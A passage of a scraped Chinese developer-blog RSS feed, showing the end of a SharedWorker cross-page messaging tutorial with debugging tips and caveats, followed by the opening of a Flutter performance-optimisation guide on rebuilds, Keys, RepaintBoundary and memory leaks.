    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"sendBroadcast()"</span>&gt;</span>广播消息<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"sendToPageB()"</span>&gt;</span>发给页面B<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"log"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-comment">// 页面唯一标识</span>
        <span class="hljs-keyword">const</span> pageId = <span class="hljs-string">'page-123'</span>;
        <span class="hljs-comment">// 1. 创建SharedWorker实例，指定Worker脚本路径</span>
        <span class="hljs-keyword">const</span> worker = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SharedWorker</span>(<span class="hljs-string">'./share.js'</span>);
        <span class="hljs-comment">// 2. 获取与Worker的通讯端口</span>
        <span class="hljs-keyword">const</span> port = worker.<span class="hljs-property">port</span>;

        <span class="hljs-comment">// 3. 允许端口通讯（必须在监听器之前调用）</span>
        port.<span class="hljs-title function_">start</span>();

        <span class="hljs-comment">// 4. 监听Worker发来的消息（使用onmessage更可靠）</span>
        port.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">msg</span>) =&gt;</span> {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'页面A收到消息:'</span>, msg.<span class="hljs-property">data</span>);
            <span class="hljs-keyword">const</span> log = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'log'</span>);
            log.<span class="hljs-property">innerHTML</span> += <span class="hljs-string">`&lt;p&gt;收到：<span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(msg.data)}</span>&lt;/p&gt;`</span>;
        };

        <span class="hljs-comment">// 5. 连接成功后立即发送注册消息</span>
        port.<span class="hljs-title function_">postMessage</span>({
            <span class="hljs-attr">type</span>: <span class="hljs-string">'register'</span>,
            <span class="hljs-attr">pageId</span>: pageId
        });

        <span class="hljs-comment">// 发送广播消息</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">sendBroadcast</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> input = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'msgInput'</span>);
            port.<span class="hljs-title function_">postMessage</span>({
                <span class="hljs-attr">type</span>: <span class="hljs-string">'broadcast'</span>,
                <span class="hljs-attr">pageId</span>: pageId,
                <span class="hljs-attr">data</span>: input.<span class="hljs-property">value</span>
            });
        }

        <span class="hljs-comment">// 发送点对点消息给页面B（页面B标识为page-456）</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">sendToPageB</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> input = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'msgInput'</span>);
            port.<span class="hljs-title function_">postMessage</span>({
                <span class="hljs-attr">type</span>: <span class="hljs-string">'private'</span>,
                <span class="hljs-attr">pageId</span>: pageId,
                <span class="hljs-attr">target</span>: <span class="hljs-string">'page-456'</span>,
                <span class="hljs-attr">data</span>: input.<span class="hljs-property">value</span>
            });
        }

        <span class="hljs-comment">// 页面关闭时断开连接</span>
        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'beforeunload'</span>, <span class="hljs-function">() =&gt;</span> {
            port.<span class="hljs-title function_">close</span>();
        });
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span>
</code></pre>
<h3 data-id="heading-6">3.3 实际调试</h3>
<h4 data-id="heading-7">3.3.1 如何调试share.js</h4>
<p>通过Chrome如何查看share.js中打印的数据，页面是无法访问的，因为它是独立的控制台。</p>
<p>为什么控制台要独立？这是因为SharedWorker运行在与页面主线程完全隔离的独立线程中，从浏览器架构和安全设计出发，其控制台输出也需与页面线程分离，避免线程间的信息干扰。</p>
<p>打开步骤：</p>
<ol>
<li>在Chrome浏览器中直接访问地址：<code>chrome://inspect/#workers</code>；</li>
<li>页面会列出当前浏览器中所有运行的Worker实例，找到目标SharedWorker对应的“inspect”链接并点击，即可打开专属控制台。</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0367fedb6578405488845baad6207d68~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6K-65rua6Zuq55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766346742&amp;x-signature=670jd6YcO%2BHlhidyWmF42YmSoAI%3D" alt="image.png" loading="lazy"/></p>
<p>控制台打印：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55752a2673c6447f9641aeb5c2b200fb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6K-65rua6Zuq55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766346742&amp;x-signature=GVYG7J6L97MBleOUS4skIH8LGrE%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-8">3.3.2 页面发送广播或私发消息</h4>
<ol>
<li>将share.js、pageA.html、pageB.html部署到同一域名下（本地可用live-server启动）。</li>
<li>同时打开两个页面，在页面A输入消息并点击“广播消息”，两个页面都会收到Worker转发的消息。</li>
<li>点击“发给页面B”，只有页面B会收到消息，实现点对点通讯。</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a0ca92941294eba87d97406014ae91c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6K-65rua6Zuq55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766346742&amp;x-signature=1UF5PPl%2F2pG4t1Ao%2F1AmoQCgCDg%3D" alt="image.png" loading="lazy"/></p>
<p>页面关闭，自动销毁</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b49f7ef884184332bde92a850938643d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6K-65rua6Zuq55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766346742&amp;x-signature=gkhJqsST35sAFd6YZWLwtxwFeIc%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-9">4、SharedWorker的注意事项</h2>
<h3 data-id="heading-10">4.1 同源策略限制严格</h3>
<p>SharedWorker的同源限制比普通Worker更严格：<strong>协议、域名、端口必须完全一致</strong>，即使是子域名（如a.example.com和b.example.com）也无法共享。</p>
<h3 data-id="heading-11">4.2 必须部署才能运行，本地直接打开无效</h3>
<p>由于浏览器的安全限制，直接双击本地HTML文件（file://协议）创建SharedWorker会报错。必须通过HTTP/HTTPS协议部署，本地可使用live-server、http-server等工具启动服务。</p>
<h3 data-id="heading-12">4.3 端口通讯需“双向启动”</h3>
<p>页面端和Worker端的<code>port.start()</code>必须都调用，否则无法正常收发消息。尤其是在使用<code>addEventListener</code>绑定消息事件时，这一步不能省略（若用<code>onmessage</code>属性绑定，部分浏览器会自动启动，但建议统一调用start()）。</p>
<h3 data-id="heading-13">4.4 消息数据需可序列化</h3>
<p>通过port传递的消息数据，必须是可结构化克隆的类型（如对象、数组、字符串等），不能传递函数、DOM元素等不可序列化的数据。若需传递复杂数据，可先转为JSON字符串，接收后再解析。</p>
<h2 data-id="heading-14">5. 总结</h2>
<p>最后总结一下：<code>SharedWorker</code>是一个能被同源多页面共享的后台线程，它通过“单一实例+管理多端口”的模式，实现跨页面通信与数据协同。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[《Flutter全栈开发实战指南：从零到高级》- 25 -性能优化]]></title>    <link>https://juejin.cn/post/7584043969687027764</link>    <guid>https://juejin.cn/post/7584043969687027764</guid>    <pubDate>2025-12-16T06:46:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584043969687027764" data-draft-id="7584013833993519138" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="《Flutter全栈开发实战指南：从零到高级》- 25 -性能优化"/> <meta itemprop="keywords" content="Flutter,Android,iOS"/> <meta itemprop="datePublished" content="2025-12-16T06:46:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="QuantumLeap丶"/> <meta itemprop="url" content="https://juejin.cn/user/1767603104125197"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            《Flutter全栈开发实战指南：从零到高级》- 25 -性能优化
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1767603104125197/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    QuantumLeap丶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:46:07.000Z" title="Tue Dec 16 2025 06:46:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<blockquote>
<p>当用户说某个App用起来很卡时，他们真正抱怨的是什么？
不是CPU使用率，不是内存占用，甚至不是帧率数字。用户感受到的是<code>响应延迟</code>、<code>界面跳帧</code>和<code>操作不跟手</code>。这就是为什么我们要做性能优化——不是为了让数字好看，而是为了让用户感知流畅。</p>
</blockquote>
<p>根据Google的用户体验研究：</p>
<ul>
<li>100ms内响应：用户感觉瞬间完成；</li>
<li>1秒内响应：用户感觉流畅自然；</li>
<li>1-3秒响应：用户开始注意到延迟；</li>
<li>3秒以上响应：用户感到不耐烦，面临卸载的可能；</li>
</ul>
<p>今天，我们将从多个维度，深入理解Flutter性能优化的<strong>是什么</strong>、<strong>为什么</strong>和<strong>怎么做</strong>。</p>
<h3 data-id="heading-1">一、优化构建性能</h3>
<h4 data-id="heading-2">是什么导致了构建性能问题？</h4>
<p>让我们先来看一张构建流程图：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[setState调用] --&gt; B[Widget树重建]
    B --&gt; C[Element树更新]
    C --&gt; D[RenderObject更新]
    D --&gt; E[布局计算]
    E --&gt; F[绘制执行]
    
    G[性能瓶颈来源] --&gt; H[过度重建]
    G --&gt; I[复杂计算]
    G --&gt; J[深度嵌套]
    G --&gt; K[不当的Key使用]
</code></pre>
<h4 data-id="heading-3">优化手段1：const构造函数 - 编译期优化</h4>
<p><strong>是什么</strong>：const构造函数创建的Widget在编译时确定，运行时不会重复构建。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>避免不必要的Widget实例创建</li>
<li>减少垃圾回收压力</li>
<li>提高热重载性能</li>
</ul>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 不推荐：每次build都创建新对象</span>
Widget build(BuildContext context) {
  <span class="hljs-keyword">return</span> Container(
    padding: EdgeInsets.all(<span class="hljs-number">16</span>), <span class="hljs-comment">// 每次创建新EdgeInsets</span>
    child: Text(<span class="hljs-string">'标题'</span>, style: TextStyle(fontSize: <span class="hljs-number">18</span>)), <span class="hljs-comment">// 每次创建新TextStyle</span>
  );
}

<span class="hljs-comment">// 优化写法：使用const</span>
Widget build(BuildContext context) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">const</span> Padding(
    padding: EdgeInsets.all(<span class="hljs-number">16</span>), <span class="hljs-comment">// const EdgeInsets</span>
    child: Text(
      <span class="hljs-string">'标题'</span>,
      style: TextStyle(fontSize: <span class="hljs-number">18</span>),
    ),
  );
}

<span class="hljs-comment">// 推荐：提取常量</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OptimizedWidget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> _padding = EdgeInsets.all(<span class="hljs-number">16</span>);
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> _textStyle = TextStyle(fontSize: <span class="hljs-number">18</span>);
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">const</span> Padding(
      padding: _padding,
      child: Text(<span class="hljs-string">'标题'</span>, style: _textStyle),
    );
  }
}
</code></pre>
<p><strong>注意点</strong>：</p>
<ul>
<li>const只能用于参数在编译时可确定的Widget</li>
<li>带回调函数的Widget不能使用const</li>
<li>列表中的item使用const效果最明显</li>
</ul>
<h4 data-id="heading-4">优化手段2：Key的正确使用 - 控制Element复用</h4>
<p><strong>是什么</strong>：Key帮助Flutter识别Widget的身份，决定是否复用Element。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>错误的Key导致不必要的Element重建</li>
<li>正确的Key保持状态在Widget移动时不被丢失</li>
</ul>
<p><strong>如何选择Key类型？</strong></p>



































<table><thead><tr><th>Key类型</th><th>适用场景</th><th>注意点</th></tr></thead><tbody><tr><td>ValueKey</td><td>基于值的唯一标识</td><td>值变化时状态重置</td></tr><tr><td>ObjectKey</td><td>基于对象的唯一标识</td><td>适合对象列表</td></tr><tr><td>UniqueKey</td><td>绝对唯一标识</td><td>每次重建都不同</td></tr><tr><td>GlobalKey</td><td>全局唯一标识</td><td>谨慎使用，性能开销大</td></tr><tr><td>PageStorageKey</td><td>保持滚动位置</td><td>用于可滚动列表</td></tr></tbody></table>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KeyOptimizationDemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _KeyOptimizationDemoState createState() =&gt; _KeyOptimizationDemoState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_KeyOptimizationDemoState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">KeyOptimizationDemo</span>&gt; </span>{
  <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">String</span>&gt; items = [<span class="hljs-string">'A'</span>, <span class="hljs-string">'B'</span>, <span class="hljs-string">'C'</span>];
  
  <span class="hljs-keyword">void</span> _reverseList() {
    setState(() {
      items = items.reversed.toList();
    });
  }
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Column(
      children: [
        ElevatedButton(
          onPressed: _reverseList,
          child: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'反转列表'</span>),
        ),
        Expanded(
          child: ListView.builder(
            itemCount: items.length,
            itemBuilder: (context, index) {
              <span class="hljs-keyword">final</span> item = items[index];
              
              <span class="hljs-comment">// 情况1：没有Key - 反转时状态会错乱</span>
              <span class="hljs-comment">// return StatefulListItem(text: item);</span>
              
              <span class="hljs-comment">// 情况2：使用index作为Key - 反转时状态错乱</span>
              <span class="hljs-comment">// return StatefulListItem(key: ValueKey(index), text: item);</span>
              
              <span class="hljs-comment">// 情况3：使用ValueKey - 反转时状态保持正确</span>
              <span class="hljs-keyword">return</span> StatefulListItem(key: ValueKey(item), text: item);
            },
          ),
        ),
      ],
    );
  }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StatefulListItem</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> text;
  
  <span class="hljs-keyword">const</span> StatefulListItem({Key? key, <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.text}) : <span class="hljs-keyword">super</span>(key: key);
  
  <span class="hljs-meta">@override</span>
  _StatefulListItemState createState() =&gt; _StatefulListItemState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_StatefulListItemState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">StatefulListItem</span>&gt; </span>{
  <span class="hljs-built_in">int</span> _counter = <span class="hljs-number">0</span>;
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> ListTile(
      title: Text(<span class="hljs-string">'<span class="hljs-subst">${widget.text}</span> - 点击次数: <span class="hljs-subst">$_counter</span>'</span>),
      onTap: () =&gt; setState(() =&gt; _counter++),
    );
  }
}
</code></pre>
<h4 data-id="heading-5">优化手段3：RepaintBoundary - 隔离重绘区域</h4>
<p><strong>是什么</strong>：创建一个独立的绘制图层，避免不必要的重绘。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>频繁变化的组件不影响静态区域</li>
<li>减少整体重绘范围</li>
<li>提高渲染效率</li>
</ul>
<p><strong>适用场景</strong>：</p>
<ul>
<li>频繁动画的组件</li>
<li>独立滚动的列表</li>
<li>视频播放器</li>
<li>游戏画布</li>
</ul>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RepaintBoundaryDemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Scaffold(
      body: Column(
        children: [
          <span class="hljs-comment">// 静态区域，不需要重绘边界</span>
          <span class="hljs-keyword">const</span> StaticHeader(),
          
          <span class="hljs-comment">// 频繁动画区域，需要隔离</span>
          RepaintBoundary(
            child: AnimatedClock(),
          ),
          
          <span class="hljs-comment">// 静态区域</span>
          <span class="hljs-keyword">const</span> StaticContent(),
          
          <span class="hljs-comment">// 独立滚动的列表</span>
          Expanded(
            child: RepaintBoundary(
              child: ProductList(),
            ),
          ),
        ],
      ),
    );
  }
}
</code></pre>
<p><strong>注意点</strong>：</p>
<ul>
<li>每个RepaintBoundary都有内存和性能开销</li>
<li>不要过度使用，特别是在深度嵌套中</li>
<li>优先隔离频繁变化的小区域</li>
</ul>
<h4 data-id="heading-6">优化手段4：didUpdateWidget - 严格控制更新</h4>
<p><strong>是什么</strong>：StatefulWidget更新时的回调，可以精确控制哪些变化需要重建。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>避免不必要的setState调用</li>
<li>可以只更新真正变化的部分</li>
<li>减少重建范围</li>
</ul>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SmartWidget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> title;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">int</span>&gt; data;
  
  <span class="hljs-keyword">const</span> SmartWidget({Key? key, <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.title, <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.data})
      : <span class="hljs-keyword">super</span>(key: key);
  
  <span class="hljs-meta">@override</span>
  _SmartWidgetState createState() =&gt; _SmartWidgetState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_SmartWidgetState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">SmartWidget</span>&gt; </span>{
  <span class="hljs-keyword">late</span> <span class="hljs-built_in">String</span> _currentTitle;
  <span class="hljs-keyword">late</span> <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">int</span>&gt; _currentData;
  <span class="hljs-built_in">String?</span> _computedResult;
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    _currentTitle = widget.title;
    _currentData = widget.data;
    _computeResult();
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> didUpdateWidget(SmartWidget oldWidget) {
    <span class="hljs-keyword">super</span>.didUpdateWidget(oldWidget);
    
    <span class="hljs-comment">// 只有title变化时才重建UI</span>
    <span class="hljs-keyword">if</span> (widget.title != _currentTitle) {
      _currentTitle = widget.title;
      setState(() {});
    }
    
    <span class="hljs-comment">// data变化时重新计算，但不一定需要重建UI</span>
    <span class="hljs-keyword">if</span> (!_listEquals(widget.data, _currentData)) {
      _currentData = widget.data;
      _computeResult();
      <span class="hljs-comment">// 这里不调用setState，因为_computedResult可能被其他Widget使用</span>
    }
  }
  
  <span class="hljs-keyword">void</span> _computeResult() {
    _computedResult = <span class="hljs-string">'计算结果: <span class="hljs-subst">${widget.data.length}</span>'</span>;
  }
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Container(
      child: Column(
        children: [
          Text(_currentTitle),
          <span class="hljs-keyword">if</span> (_computedResult != <span class="hljs-keyword">null</span>) Text(_computedResult!),
        ],
      ),
    );
  }
}
</code></pre>
<h3 data-id="heading-7">二、优化内存</h3>
<h4 data-id="heading-8">Flutter内存泄漏的根源？</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[内存泄漏] --&gt; B[未释放的订阅]
    A --&gt; C[未取消的Timer]
    A --&gt; D[未dispose的Controller]
    A --&gt; E[循环引用]
    A --&gt; F[大对象未及时释放]
    
    G[泄漏影响] --&gt; H[内存持续增长]
    G --&gt; I[OOM崩溃]
    G --&gt; J[应用被系统终止]
    G --&gt; K[用户体验差]
</code></pre>
<h4 data-id="heading-9">优化手段1：管理资源生命周期</h4>
<p><strong>是什么</strong>：确保所有需要手动释放的资源都被正确释放。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>Dart有垃圾回收，但某些资源需要手动管理</li>
<li>未释放的资源会导致内存泄漏</li>
<li>订阅和监听器可能持有Widget引用</li>
</ul>
<p><strong>需要管理的资源类型</strong>：</p>
<ol>
<li>StreamSubscription</li>
<li>Timer</li>
<li>ScrollController/TextEditingController</li>
<li>AnimationController</li>
<li>FocusNode</li>
<li>ImageStream</li>
</ol>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 典型的内存泄漏</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LeakyWidget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _LeakyWidgetState createState() =&gt; _LeakyWidgetState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_LeakyWidgetState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">LeakyWidget</span>&gt; </span>{
  StreamSubscription? _subscription;
  Timer? _timer;
  ScrollController _controller = ScrollController();
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    
    <span class="hljs-comment">// 订阅Stream</span>
    _subscription = Stream.periodic(<span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">1</span>))
        .listen((_) =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'tick'</span>));
    
    <span class="hljs-comment">// 启动Timer</span>
